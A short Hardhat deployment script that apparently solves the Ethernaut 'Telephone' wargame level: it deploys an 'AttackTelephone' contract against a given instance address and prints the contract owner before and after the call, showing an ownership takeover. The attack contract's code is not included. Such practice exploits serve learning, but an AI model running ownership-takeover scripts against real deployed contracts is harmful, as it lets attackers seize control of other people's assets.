const hre = require("hardhat");

async function main() {
  const [Owner] = await ethers.getSigners();
  const TelephoneContract = await hre.ethers.getContractFactory("Telephone");
  // attach your instance address
  const Instance = "0x891cC3Cb84aB300886E7554d4F0D02829c6a34F7";
  const Telephone = TelephoneContract.attach(Instance);
  const AttackContract = await ethers.getContractFactory("AttackTelephone");
  const Attack = await AttackContract.deploy(Instance);
  await Attack.deployed();
  const owner = await Telephone.owner();
  console.log("Attacking...");
  const tx = await Attack.Attack();
  await tx.wait(1);
  const newOwner = await Telephone.owner();

  console.log(owner, newOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
